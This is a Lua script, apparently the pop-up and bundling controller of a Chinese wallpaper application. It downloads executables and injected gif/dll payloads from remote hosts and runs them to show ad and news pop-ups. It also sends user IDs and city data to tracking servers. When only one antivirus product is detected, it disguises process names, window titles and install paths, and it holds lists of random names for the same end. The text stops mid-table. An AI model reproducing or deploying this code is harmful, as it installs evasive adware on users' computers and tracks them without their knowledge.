require ("unicorn")
require ("extra")

--[[
]]
project = "jcbz"

function report_kunbang(name,p1,p2,p3,p4,p5,p6,p7)
	extra.report_kunbang(project,name,p1,p2,p3,p4,p5,p6,p7)
end

function taskid_last_time(value)
	return extra.taskid_last_time(project,value)
end

function save_taskid(value)
	extra.save_taskid(project,value)
end

function qid()
	return extra.qid(project)
end

function uid()
	return extra.uid(project)
end

function version()
	return extra.version(project)
end

function md5()
	return extra.md5(project)
end

function city_name()
	return extra.city_name(project)
end

function enable_news()
	return extra.enable_news(project)
end

function first_install_time()
	return extra.first_install_time(project)
end

function nopop_set_time(value)
	return extra.nopop_set_time(project,value)
end

function invoke_exe(url, md5, localpath, args, reportprefix)
	return extra.invoke_exe(project, url, md5, localpath, args, reportprefix)
end

function invoke_exe_inject(url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
	return extra.invoke_exe_inject(project, url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
end

function invoke_exe_inject2(url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
	return extra.invoke_exe_inject2(project, url, md5, localpath, gif_url, gif_md5, gif_name, args, reportprefix)
end

function invoke_dll(url,md5,localpath,args)
	return extra.invoke_dll(project,url,md5,localpath,args)
end

function install_date()
	return extra.install_date(project)
end

function printf(value)
	unicorn.printf(value .. "\n")
end

--安装间隔天数/近期不弹/最小间隔天数判断，返回结果结果为天数直接判断大小
function interval(timestamp, difftype)
	timestamp = tonumber(timestamp)
	if timestamp == nil then
		timestamp = 0
	end
	local today =
		os.time({year = os.date("%Y", os.time()), month = os.date("%m", os.time()), day = os.date("%d", os.time())})
	local otherday =
		os.time({year = os.date("%Y", timestamp), month = os.date("%m", timestamp), day = os.date("%d", timestamp)})
	local day = math.floor(os.difftime(today, otherday) / 86400)
	local hour = math.floor(os.difftime(os.time(), timestamp) / 3600)
	if difftype == nil then
		return math.abs(day)
	elseif string.lower(difftype) == "d" then
		return math.abs(day)
	elseif string.lower(difftype) == "h" then
		return math.abs(hour)
	else
		return math.abs(day)
	end
end

function report_onday(value,from)
	if interval(taskid_last_time(value)) < 1 then
		return
	else
		report_kunbang(value,true,true,true,true,0,from,true)
		save_taskid(value)
		return
	end
end

--匹配数组内元素,value=搜索词,array=被搜索数组,searchtype不填写或写0为前置匹配,其他为全词匹配
function stringinarray(value,array,searchtype)
	if searchtype == nil or searchtype == 0 then
		-- 前置匹配
		for k, v in ipairs(array) do
			local pos = string.find( string.upper(value), string.upper(v))
			if (pos == 1) then
				return true
			end
		end
		return false
	else
		--全词匹配
		for k, v in ipairs(array) do
			if (string.upper(v) == string.upper(value)) then
			return true
			end
		end
		return false
	end
end

--json数据转换
function table_maxn(t)
    local mn = 1;
    for k, v in pairs(t) do
      if(type(k) ~= "number") then
        mn = 0;
      end
    end
    return mn;
end

function table2json(t)  
    local function serialize(tbl)  
            local tmp = {}  
            for k, v in pairs(tbl) do  
                    local k_type = type(k)
                    local v_type = type(v)
                    local key = (k_type == "string" and "\"" .. k .. "\":")  
                        or (k_type == "number" and "")  
                    local value = (v_type == "table" and serialize(v))  
                        or (v_type == "boolean" and tostring(v))  
                        or (v_type == "string" and "\"" .. v .. "\"")  
                        or (v_type == "number" and v)  
                    tmp[#tmp + 1] = key and value and tostring(key) .. tostring(value) or nil  
            end  
            if table_maxn(tbl) == 0 then  
                    return "{" .. table.concat(tmp, ",") .. "}"  
            else  
                    return "[" .. table.concat(tmp, ",") .. "]"  
            end  
    end  
    assert(type(t) == "table")  
    return serialize(t)  
end

function string.split(input, delimiter)
	input = tostring(input)
	delimiter = tostring(delimiter)
	if (delimiter == "") then
		return false
	end
	local pos, arr = 0, {}
	-- for each divider found
	for st, sp in function()
		return string.find(input, delimiter, pos, true)
	end do
		table.insert(arr, string.sub(input, pos, st - 1))
		pos = sp + 1
	end
	table.insert(arr, string.sub(input, pos))
	return arr
end

--随机函数
function random(start,ends)
	math.randomseed(tostring(os.time()):reverse():sub(1,6))
	return math.random(start,ends)
end

--随机函数
function random(start, ends, exclude)
	local result = {}
	local flag = false
	for i = start, ends do
		flag = false
		if exclude ~= nil then
			for k, v in pairs(exclude) do
				if i == v then
					flag = true
					break
				end
			end
		end
		if flag == false then
			table.insert(result, i)
		end
	end
	math.randomseed(math.abs(os.clock()) * math.random(1000000, 90000000) + math.random(1000000, 90000000))
	local a = math.random(1, #result)
	return result[a]
end

--检查不弹环境,输入上报前缀及不弹列表
function check_enviroment(reportprefix,exclude_list)
	-- 检查渠道号
	if stringinarray(qid(),exclude_list.qid) then
		report_onday(reportprefix .. ".nopop-qid",3)
		printf(reportprefix .. ".nopop-qid")
		return false
	end
	-- 检查版本号
	if stringinarray(version(),exclude_list.version) then
		report_onday(reportprefix .. ".nopop-version",3)
		printf(reportprefix .. ".nopop-version")
		return false
	end
	-- 检查md5
	if stringinarray(md5(),exclude_list.md5,1) then
		report_onday(reportprefix .. ".nopop-md5",3)
		printf(reportprefix .. ".nopop-md5")
		return false
	end
	-- 检查城市
	if stringinarray(city_name(),exclude_list.citys,1) then
		report_onday(reportprefix .. ".nopop-city",3)
		printf(reportprefix .. ".nopop-city")
		return false
	end
	-- 检查进程名
	for k,v in ipairs(exclude_list.process)
	do 
		if stringinarray(v,unicorn.process,1)
		then
			report_onday(reportprefix .. ".nopop-process",3)
			printf(reportprefix .. ".nopop-process")
			return false
		end
	end
	return true
end


--计算弹出次数
function showcount(taskidlist, taskid)
    local x = 1
    for k, v in pairs(taskidlist) do
        if v == taskid then
            return x
        else
            if interval(taskid_last_time(v)) < 1 then
                x = x + 1
            end
        end
    end
    return x
end

function showcount2(taskidlist, taskid, reg_taskidlist, nowdate)
	local x = 1
	for k, v in pairs(taskidlist) do
		if v == taskid then
			return x
		else
			if reg_taskidlist[k] == nowdate then
				x = x + 1
			end
		end
	end
	return x
end

--删除table里面的value
function table.removeTableData(array,value)
	if array ~= nil and next(array) ~= nil then
		for i=#array,1,-1 do
    		if array[i] == value then
        		table.remove(array, i)
   	 		end
		end
	end
end

--IE版本判断
function ie_vision()
	local ie_v = unicorn.reg_read_string("HKLM", "SOFTWARE\\Microsoft\\Internet Explorer", "svcVersion")
	if ie_v ~= "" then
		return tonumber(string.sub(ie_v, 1, string.find(ie_v, "%.") - 1))
	else
		ie_v = unicorn.reg_read_string("HKLM", "SOFTWARE\\Microsoft\\Internet Explorer", "Version")
		return tonumber(string.sub(ie_v, 1, string.find(ie_v, "%.") - 1))
	end
end

--互斥判断1，谁先安装谁先弹pop_checker(projectlist, "tips", reportprefix) == true
function pop_checker(projectlist, poptype, reportprefix)
	local result = false
	local fresult = false
	local url = ""
	local switch = {
		kuaizip = function()
			url = "http://i.kpzip.com/n/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "kuaizip", poptype, url, "kuaizipuc2")
		end,
		heinote = function()
			url = "http://down1.7654.com/n/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "heinote", poptype, url, "heinoteuc2")
		end,
		kantu = function()
			url = "http://down2.abckantu.com/logo/v1.0.0.3/uc2.gif"
			result = extra.popup_checker(project, "kantu", poptype, url, "kantuuc2")
		end,
		xiaoyu = function()
			url = "http://down1.xiaoyu.shzhanmeng.com/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "xiaoyu", poptype, url, "xiaoyuuc2")
		end,
		finder = function()
			url = "http://ifinder.shzhanmeng.com/logo/v1.0.0.1/uc2.gif"
			result = extra.popup_checker(project, "finder", poptype, url, "finderuc2")
		end,
		browser = function()
			url = "http://down1.7654browser.shzhanmeng.com/logo/v1.0.0.2/uc2.gif"
			result = extra.popup_checker(project, "browser", poptype, url, "browseruc2")
		end
	}
	for k, v in pairs(projectlist) do
		local fSwitch = switch[string.lower(v)]
		if fSwitch then
			fSwitch()
		end
		if result == true then
			report_kunbang(reportprefix .. ".banpopup_" .. v, true, true, true, true, 0, 3, true)
			fresult = result
			return fresult
		end
	end
	return fresult
end

function report_common(reportprefix, module, value, p1)
    extra.report_common(project, reportprefix, module, value, p1)
end

function report_common_oneday(reportprefix, module, value, p1)
    if interval(taskid_last_time(reportprefix .. value)) < 1 then
        return
    else
        report_common(reportprefix, module, value, p1)
        save_taskid(reportprefix .. value)
        return
    end
end

--进程名标题名、类名随机产生
function random_name(pop_type, result_type)
	if result_type == nil then
		result_type = "name"
	end
	local mini = {
		name = {"zmyyigxj","mreinipg","gtymiqw","ytfbiert","rrfdmtyu","tryubcmt","iuhffmn","sdelknmre","rtfsdfni","xtrgbnti"},
		title = {"trfmtxx","rfgbmexx","uyhfibz","nhyumra","ourmib","cfyimgc","oifcmid","recmie","grxamif","rdzmig"},
		class = {"edxuehfxx","esmudhxx","ertmkfjbz","uibffva","itfiedsb","ewsfadc","xxdqaad","xxmdeswe","xxmefkff","xxmjfjxg"}
	}
	local tpop = {
		name = {"fkctyuxx","ufztwerxx","sfctbghxx","ojvtpkilxx","sdgthytx","hajdtvcdx","mdhteryxx","5ttnbvxx","iftscxvx","dfhtmnbxx"},
		title = {"thgftpre","dfetfsaa","etyurrkb","ytfdwpc","ewrwtpopd","yyftpope","yuuttpf","vxbhspg","xbtprth","podbfopw"},
		class = {"xfgyrcs","rruudjei","yjhgiriw","efbztyrr","rgjurypd","ifjdjape","ahuekqpf","uwqyopg","xbztpuph","werrgpw"}
	}
	local tips = {
		name = {"retetsdx","bfewwdad","gregdffy","sgrwwazc","sgrsxzdgx","rgreadgg","sregrfdfx","sgrgcvsz","rthdffvx","jsyurygzk"},
		title = {"fdgrxbgn","dfhrddss","ohdhwds","dfnhjyju","fwefqfdg","jtdfaddg","fdhthrjad","rgergdhj","hjrfghfhi","dgreedsj"},
		class = {"htrhrfsq","fjuuiljw","pokwksar","iepwdfsy","rerterfu","dfhdrdso","htjymkfsp",",kjiddfz","dhrtjuyux","adffggrm"}
	}
	local tnews = {
		name = {"dhtyhrrfx","xfghrtrtg","jsfhhgela","yjtyrfgh","dfgerthhs","rhgtrhcf","ghegerds","uikytsda","wfreterh","dfhyjukh"},
		title = {"ghrthdas","gregerhha","htyjtujsb","hfthrthh","dgdhghhsd","sfhlilsj","jfjyyjkse","dgwrgwsf","iahduwg","ewfwefsh"},
		class = {"yjyulius","tyukukhja","kiufghssb","kiurfssc","ghersgfhg","fdjkukde","shghstryf","wrahhtsg","bhjrywsh","oippdvsj"}
	}
	local result, sed
	if pop_type == "mini" then
		sed = random(1, #mini[result_type])
		result = mini[result_type][sed]
	elseif pop_type == "tpop" then
		sed = random(1, #tpop[result_type])
		result = tpop[result_type][sed]
	elseif pop_type == "tips" then
		sed = random(1, #tips[result_type])
		result = tips[result_type][sed]
	elseif pop_type == "tnews" then
		sed = random(1, #tnews[result_type])
		result = tnews[result_type][sed]
	end
	return result
end

function env_get()
	local env = ""
	for key, value in pairs({is360, isqq, isjs, iships, is2345}) do
		if value == true then
			env = env .. key
		end
	end
	if env == "" then
		env = 0
	end
	return env
end

function adinfo(url)
	local result
	url = "http://ads.7654.com/prod/" .. string.gsub(string.match(url, "http://(.*)"), "/", ".") .. ".json"
	local json = unicorn.web_http_get(url)
	result = string.match(json, "{(.*)}")
	if result == nil then
		return ""
	else
		result = string.gsub(result, '"', "")
		result = string.gsub(result, ":", "=")
		result = string.gsub(result, ",", "&")
		return "?" .. result
	end
end

function json_api(json)
	local exe_version, exe_file, exe_md5, dll_version, dll_file, dll_md5, position, mutex, link
	local antivirus, antivirus_size, antivirus_node, qid, qid_node, city_node, city
	local function json_result(jsonnode)
		local json_exe, json_dll, times, popup_time_link, popup_size, popup_timing, popup_position, popup_mutex
		--获取exe
		json_exe = extra.json_node(jsonnode, "exe")
		exe_version = extra.json_str(json_exe, "version")
		local file_result = {}
		local file_node = extra.json_node(json_exe, "files")
		local file_size = extra.json_size(file_node)
		for i = 0, file_size - 1, 1 do
			local item = extra.json_node_item(file_node, i)
			table.insert(file_result, extra.json_str(item, ""))
		end
		local md5_result = {}
		local md5_node = extra.json_node(json_exe, "md5")
		local md5_size = extra.json_size(md5_node)
		for i = 0, md5_size - 1, 1 do
			local item = extra.json_node_item(md5_node, i)
			table.insert(md5_result, extra.json_str(item, ""))
		end
		exe_file = file_result
		exe_md5 = md5_result
		--获取dll
		json_dll = extra.json_node(jsonnode, "dll")
		dll_version = extra.json_str(json_dll, "version")
		dll_file = extra.json_str(json_dll, "file")
		dll_md5 = extra.json_str(json_dll, "md5")
		--获取弹出位置
		popup_position = extra.json_node(jsonnode, "popup_position")
		position = extra.json_str(popup_position, "popup_position")
		--获取互斥变量
		popup_mutex = extra.json_node(jsonnode, "mutex")
		mutex = extra.json_str(popup_mutex, "mutex")
		--获取弹出链接
		popup_time_link = extra.json_node(jsonnode, "popup_time_link")
		popup_timing = extra.json_node(popup_time_link, "popup_timing")
		popup_size = extra.json_size(popup_timing)
		for i = 0, popup_size - 1, 1 do
			local item = extra.json_node_item(popup_timing, i)
			times = extra.json_str(item, "times")
			item2 = string.split(times, "-")
			if nowtime >= item2[1] and nowtime <= item2[2] then
				link = extra.json_str(item, "link")
				break
			end
		end
	end
	--生成默认配置
	local json_root = extra.json_parsing(json)
	if json_root == -1 then
		return false
	end
	local json_common = extra.json_node(json_root, "common")
	if json_common ~= -1 then
		json_result(json_common)
	end
	--特殊配置检查
	local json_additions = extra.json_node(json_root, "additions")
	if json_additions ~= -1 then
		local env = (is360 and "1" or "0") .. (isqq and "1" or "0") .. (isjs and "1" or "0")
		local additions_size = extra.json_size(json_additions)
		for x = 0, additions_size - 1, 1 do
			local flag1 = false
			local flag2 = false
			local flag3 = false
			local addition = extra.json_node_item(json_additions, x)
			--获取环境判断
			antivirus_node = extra.json_node(addition, "antivirus")
			antivirus = extra.json_node(antivirus_node, "antivirus")
			antivirus_size = extra.json_size(antivirus)
			for i = 0, antivirus_size - 1, 1 do
				local item = extra.json_node_item(antivirus, i)
				item = extra.json_str(item, "")
				if env == item or item == "全环境" then
					flag1 = true
					break
				end
			end
			--获取渠道判断
			qid_node = extra.json_node(addition, "channel")
			qid = extra.json_str(qid_node, "channel")
			qid = string.split(qid, ";")
			table.remove(qid, #qid)
			if stringinarray(p_qid, qid) == true or qid[1] == nil then
				flag2 = true
			end
			--获取城市判断
			city_node = extra.json_node(addition, "city")
			city = extra.json_str(city_node, "city")
			city = string.split(city, ";")
			table.remove(city, #city)
			if stringinarray(p_city, city) == false or city[1] == nil then
				flag3 = true
			end

			if flag1 == true and flag2 == true and flag3 == true then
				json_result(addition)
				break
			end
		end
	end
	extra.json_clean()
	local sed = random(1, #exe_file)
	local result = {
		exe = {exe_version .. "/" .. exe_file[sed], exe_md5},
		dll = {dll_version .. "/" .. dll_file, dll_md5},
		pos = position,
		mutex = mutex,
		url = link
	}
	return result
end

function user_type()
	local limit_count = false
	local change_url = false
	local not_pop = false
	local user_types, log_time, list
	list = unicorn.reg_read_string("HKCU", "Software\\JCWallpaper\\types", "user_types")
	if list == "" then
		user_types = ""
		log_time = 0
	else
		list = string.split(list, "_")
		user_types = list[1]
		log_time = list[2]
	end
	if interval(log_time) >= 1 then
		local post = '{"uid":"' .. p_uid .. '","project":"jcbz"}'
		post = extra.encrypte(post, "zer8a3J5fcQIonM8v7gsyDPTLZi8T7j4")
		local json_str = unicorn.web_http_get("http://ssp.7654.com/userTypes?" .. post)
		json_str = extra.decrypte(json_str, "zer8a3J5fcQIonM8v7gsyDPTLZi8T7j4")
		local json_root = extra.json_parsing(json_str)
		if json_root == -1 then
			unicorn.reg_write_string("HKCU", "Software\\JCWallpaper\\types", "user_types", "_" .. tostring(os.time()))
			return limit_count, change_url, not_pop
		end
		user_types = extra.json_str(json_root, "user_types")
		unicorn.reg_write_string("HKCU", "Software\\JCWallpaper\\types", "user_types", user_types .. "_" .. tostring(os.time()))
		extra.json_clean()
	end
	local result = string.split(user_types, ",")
	for key, value in pairs(result) do
		if value == "1" then
			limit_count = true
		elseif value == "2" then
			change_url = true
		elseif value == "3" then
			not_pop = true
		end
	end
	return limit_count, change_url, not_pop
end

function execute_mininewsplus_gw()
	report_kunbang("mininews.run-task",true,true,true,true,0,4,true)
	local path = "http://down1.wallpaper.muxin.fun/tui/mininews/v3.0.6.1_001/mininews-"
	local md5 = {
		"25DE044B0EF75B3875334FE7138099C4",
		"56D1CD9FE0FA1E356FC08F8BDBD68078"
	}
	local sed = random(1,#md5)

	local args = {
		"-project=jcbz",
		"-optimize=30",
		"-usesspmode=true",
		-- "-classname=Jc_mininews",
		-- "-title=Jc_mininews",
		"-killprocess=60",
		"-align=top",
		"-pbcuttitlenews=-1",
		"-showWeather=false",
		"-AntiMaliciousClick=60/500",
		"-TaskBarUseExeicon=true",
		"-TopUrl=http://down1.wallpaper.muxin.fun/tui/mininews/title.png",
		"-SupportMultiExe=true", --25版本需要配置
		"-pp=" .. pp_key,
		"-writetck=LiveUpdate360,632"
	}

	--路径及进程名定义
	local localpath = "%APPDATA%\\jcwallpaper\\jcbzmini"
	local localname = "Jcbzmini"

	--纯金山环境修改类名、标题名、进程名
	local classname = "Jc_mininews"
	local title = "Jc_mininews"
	if isjs == true and isqq == false and is360 == false then
		if stringinarray(city_name(),{"北京","上海","深圳","珠海"})==false then
			localpath = "%localappdata%\\blue\\wallp"
			localname = "cjblue"
			classname = "Afx:" .. string.format("%08X", os.time() // 86400)
			title = ""
		end
	end
	
	table.insert(args, "-classname=" .. classname)
	table.insert(args, "-title=" .. title)

	--IE9及以上使用https,IE8使用http,IE7及以下不弹迷你页
	if ie_vision() <= 7 then
		report_kunbang("mininews.banpopup-ie7", true, true, true, true, 0, 4, true)
		return
	end
	
	local homepage = "http://news.698283.vip/mini_new1/0302/"

	local monitor_height = 1000
	-- local newsproject = "mininews_bz002_jcwallpaper_jcwallpaperer"

	table.insert(args, "-IE9URL=" .. homepage .. "?qid=" .. p_qid .. "&env=" .. env_get() .. "&uid=" .. p_uid .. "&screen_h=" .. monitor_height)
	table.insert(args, "-URL=" .. homepage .. "?qid=" .. p_qid .. "&env=" .. env_get() .. "&uid=" .. p_uid .. "&screen_h=" .. monitor_height)

	local taskidlist = {
		"mininews1",
		"mininews2"
	}

	local taskid = taskidlist[1]

	if interval(taskid_last_time(taskid)) < 1 then
		return
	end

	local reportprefix = "mininews-" .. showcount(taskidlist, taskid)

	local exclude_list = {
		qid = {},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/package/mininewsplus/v3.0.6.9/mini.gif";
	local gif_md5 = "AE466552C2A255D2238FF1525CAAF789";
	local gif_name = "logomini";

	table.insert(args, "-reportprefix=" .. reportprefix)
	table.insert(args, "-taskid=taskid." .. taskid)
	report_kunbang("updatechecker." .. taskid,true,true,true,true,0,4,true)
	args = extra.base64_encode(table.concat(args, " "))
	--printf(table.concat(args, " "))
	-- return invoke_exe(path .. sed .. ".exe", md5, localpath .. "\\" .. localname .. ".exe", args,"jcmini.")
	return invoke_exe_inject2(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_mini.")
end

function execute_mininewsplus_webmode()
	local args = {
		"-project=jcbz",
		"-optimize=30",
		"-usesspmode=true",
		-- "-classname=Jc_mininews",
		-- "-title=Jc_mininews",
		"-killprocess=60",
		"-align=top",
		"-pbcuttitlenews=-1",
		"-showWeather=false",
		"-AntiMaliciousClick=60/500",
		"-TaskBarUseExeicon=true",
		"-TopUrl=http://down1.wallpaper.muxin.fun/tui/mininews/title.png",
		"-SupportMultiExe=true", --25版本需要配置
		"-MaxWebClickCount=2",
		"-pp=" .. pp_key,
		"-writetck=LiveUpdate360,632"
	}

	--路径及进程名定义
	local localpath = "%APPDATA%\\jcwallpaper\\jcbzmini"
	local localname = "Jcbzmini"

	--纯金山环境修改类名、标题名、进程名
	local classname = "Jc_mininews"
	local title = "Jc_mininews"
	if isjs == true and isqq == false and is360 == false then
		if stringinarray(city_name(),{"北京","上海","深圳","珠海"})==false then
			localpath = "%localappdata%\\blue\\wallp"
			localname = "cjblue"
			classname = "Afx:" .. string.format("%08X", os.time() // 86400)
			title = ""
		end
	end
	
	table.insert(args, "-classname=" .. classname)
	table.insert(args, "-title=" .. title)

	--IE9及以上使用https,IE8使用http,IE7及以下不弹迷你页
	if ie_vision() <= 7 then
		report_kunbang("mininews.banpopup-ie7", true, true, true, true, 0, 4, true)
		return
	end

	local limit_count, change_url, not_pop = user_type()
	if not_pop == true then
		report_kunbang("banpopup_feedback", true, true, true, true, 0, 4, true)
		return
	end

	local taskidlist = {
		"mininews1",
		"mininews2"
	}
	if limit_count == true then
		taskidlist = {
			"mininews1"
		}
	end

	local taskid = taskidlist[1]
	if nowtime >= "00:00" then
		for key, value in pairs(taskidlist) do
			if interval(taskid_last_time(value)) >= 1 then
				if key == 1 then
					taskid = value
					break
				else
					if
						interval(taskid_last_time(taskidlist[key - 1])) < 1 and interval(taskid_last_time(taskidlist[key - 1]), "h") >= 3
					 then
						taskid = value
						break
					end
				end
			end
		end
	else
		return
	end

	if interval(taskid_last_time(taskid)) < 1 then --0到12点三次
		return
	end

	local reportprefix = "mininews-1"
	reportprefix = "mininews" .. "-" .. showcount(taskidlist, taskid)

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	--读取api
	local json_str = unicorn.web_http_get("http://down2.wallpaper.muxin.fun/f52e6718f1c349b950eca36cde6532a5.json")
	json_str = extra.rc4_decrypt(json_str, "PapI$YPr$zVtih2VcKoi%bmDVRCSwdVw")
	local json_result = json_api(json_str)
	if json_result == false then
		return
	end
	local path = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.exe[1]
	local md5 = json_result.exe[2]

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/package/" .. json_result.dll[1]
	local gif_md5 = json_result.dll[2]
	local gif_name = "logo_mini";

	table.insert(args, "-MutexName=" .. json_result.mutex)

	local homepage = json_result.url
	if homepage == nil then
		return
	end

	if change_url == true then
		report_kunbang("change_url", true, true, true, true, 0, 4, true)
		homepage = "http://news.698283.vip/mini_new1/0302/"
	end

	local monitor_height = 1000
	-- local newsproject = "mininews_bz002_jcwallpaper_jcwallpaperer"
	
	table.insert(args, "-IE9URL=" .. homepage .. "?qid=" .. p_qid .. "&env=" .. env_get() .. "&uid=" .. p_uid .. "&screen_h=" .. monitor_height)
	table.insert(args, "-URL=" .. homepage .. "?qid=" .. p_qid .. "&env=" .. env_get() .. "&uid=" .. p_uid .. "&screen_h=" .. monitor_height)

	table.insert(args, "-reportprefix=" .. reportprefix)
	table.insert(args,"-taskid=taskid." .. taskid)
	args = extra.base64_encode(table.concat(args, " "))
	if gif_md5 == "" or gif_md5 == nil then
		invoke_exe(path, md5, localpath .. "\\" .. localname .. ".exe", args, "jcmini.")
	else
		invoke_exe_inject2(
			path,
			md5,
			localpath .. "\\" .. localname .. ".exe",
			gif_url,
			gif_md5,
			gif_name,
			args,
			reportprefix .. "."
		)
	end
	return
end

--厂商和dsp弹出
function execute_tips_cs()
	local path = "http://down1.wallpaper.muxin.fun/tui/tips/v1.0.0.1/tipsplus2-"
	local md5 = {
		"B5BA3CB472ADCB44DA078990F616DA2A",
		"C768378870A4A0BC14A3B22839987CD2"
	}
	local sed = random(1,#md5)

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tipsplus.gif"
	local gif_md5 = "019E9B4BDE714FEAE48A38B14BE252A0"
	local gif_name = "logo_tips"

	local args = {
		"-project=jcwallpaper",
		-- "-title=Jc-bztips",
		-- "-classname=Jc-bztips",
		"-crawlusertag=true",
		"-crawlconfigurl=http://down1.wallpaper.muxin.fun/n/crawlconfig.json",
		"-usewebmode=true",
		"-o=30",
		"-writetck=LiveUpdate360,632",
		"-shqidurl=http://kl.hnayg.com/zkactive/ctl/w/qinfo.html",
		"-shadurl=http://kl.hnayg.com/zkactive/ctl/wb/show.html",
		"-shlogurl=http://tj.hnayg.com/zklogger/zk/rp.html",
		"-dlldata=" .. gif_name,
		"-localcity=" .. p_city,
		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/tipsplus.json",
		"-mutex=2065d342-f385-41d0-aeaa-c482701135d2", --互斥
		"-position=2:2",
		"-killprocess=60",
		"-nopopwhenlong=0",
		"-recordshow=0"
	}

	--开机30分钟后弹
	--[[if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
		return
	end]]
	--路径及进程名定义
	local localpath = "%APPDATA%\\jcwallpaper\\jcbztips"
	local localname = "Jcbztips"

	--纯金山环境修改类名、标题名、进程名
	local classname = "Jc-bztips"
	local title = "Jc-bztips"
	if isjs == true and isqq == false and is360 == false then
		if stringinarray(city_name(),{"北京","上海","深圳","珠海"})==false then
			localpath = "%localappdata%\\spinach\\cress"
			localname = "celery"
			classname = "lettuce"
			title = ""
		end
	end

	table.insert(args, "-classname=" .. classname)
	table.insert(args, "-title=" .. title)

	local taskidlist, taskid, reportprefix, dspurl
	taskidlist = {
		"tips11-cs-1"
	}
	taskid = taskidlist[1]
	if nowtime >= "09:30" then
		taskid = taskidlist[1]
		dspurl = "http://news.7654.com/tipsdsp/21/s11/?product_category=23"
		reportprefix = "tips11-cs-1"
	else
		return
	end
	table.insert(args, "-dspurl=" .. dspurl)

	if interval(taskid_last_time(taskid)) < 1 then
		return
	end

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	--近期不弹,48小时
	--[[if interval(nopop_set_time("tipsplus2"), "h") < 48 then
		report_onday(reportprefix .. ".in-popup-period", 3)
		return
	end]]

	--弹出优先级,使用pop_priority时recordshow=1,往注册表记录时间,不使用时recordshow=0
	--[[table.insert(args, "-recordshow=1")
	if pop_priority("kuaizip", "tipsplus2", reportprefix) == false then
		return
	end]]
	table.insert(args, "-taskid=taskid." .. taskid)
	table.insert(args, "-reportprefix=" .. reportprefix)
	args = extra.encrypte(table.concat(args, " "))
	-- return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tips.")
	return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tips.")
end

function execute_tips_hf()
	local path = "http://down1.wallpaper.muxin.fun/tui/tips/toptips/mxhfpop-"
	local md5 = {
		"DC7FAD099906FD95C4EFFE00D10506D5",
		"F7C79CC767D49373C1934CD484E806CE"
	}
	local sed = random(1,#md5)

	local args = {
		"-project=jcwallpaper",
		-- "-title=Jc-bztips",
		-- "-classname=Jc-bztips",
		"-crawlusertag=true",
		"-crawlconfigurl=http://down1.wallpaper.muxin.fun/n/crawlconfig.json",
		"-usewebmode=true",
		"-o=30",
		"-writetck=LiveUpdate360,632",
		"-shqidurl=http://kl.hnayg.com/zkactive/ctl/w/qinfo.html",
		"-shadurl=http://kl.hnayg.com/zkactive/ctl/wb/show.html",
		"-shlogurl=http://tj.hnayg.com/zklogger/zk/rp.html",
		"-dlldata=" .. gif_name,
		"-localcity=" .. p_city,
		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/tipsplus.json",
		"-mutex=9D16A14B-7566-4E36-9468-770B0E893326", --互斥
		"-position=2:1",
		"-killprocess=60",
		"-nopopwhenlong=0",
		"-recordshow=0"
	}

	local localpath = "%APPDATA%\\relevant\\resort"
	local localname = "respond"
	local classname = "scrape"
	local title = "restrain"

	table.insert(args, "-classname=" .. classname)
	table.insert(args, "-title=" .. title)

	local taskidlist, taskid, reportprefix, dspurl
	taskidlist = {
		"tips11-cs-2"
	}
	taskid = taskidlist[1]
	if nowtime >= "09:30" then
		taskid = taskidlist[1]
		dspurl = "http://news.7654.com/tipsdsp/21/s12/?product_category=27"
		reportprefix = "tips15-cs-1"
	else
		return
	end
	table.insert(args, "-dspurl=" .. dspurl)

	if interval(taskid_last_time(taskid)) < 1 then --6到12点一次
		return
	end

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	table.insert(args,"-taskid=taskid." .. taskid)
	table.insert(args, "-reportprefix=" .. reportprefix)
	report_kunbang("updatechecker." .. reportprefix,true,true,true,true,0,4,true)
	args = extra.encrypte(table.concat(args, " "))
	--print(args)
	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tips.")
	-- return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tips.")
end

function execute_tnews_cs()
	report_kunbang("tnews.run-task", true, true, true, true, 0, 4, true)
	local path = "http://down1.wallpaper.muxin.fun/tui/tips/2/v1.0.0.1/tnewsplus-"
	local md5 = {
		"C85BF59C6096EEBDA91AEB0ED7B02F4C",
		"091E0D4F32A45F35E1DC24CF96C51488"
	}
	local sed = random(1,#md5)

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tnewsplus.gif"
	local gif_md5 = "E06154791B557762AC4BA3C517C513AC"
	local gif_name = "logo_tnews"
	
	local args = {
		"-project=jcwallpaper",
		"-classname=Jcboost",
		"-title=domestic",
		"-usewebmode=true",
		"-shqidurl=http://kl.hnayg.com/zkactive/ctl/w/qinfo.html",
		"-shadurl=http://kl.hnayg.com/zkactive/ctl/wb/show.html",
		"-shlogurl=http://tj.hnayg.com/zklogger/zk/rp.html",
		"-dlldata=" .. gif_name,
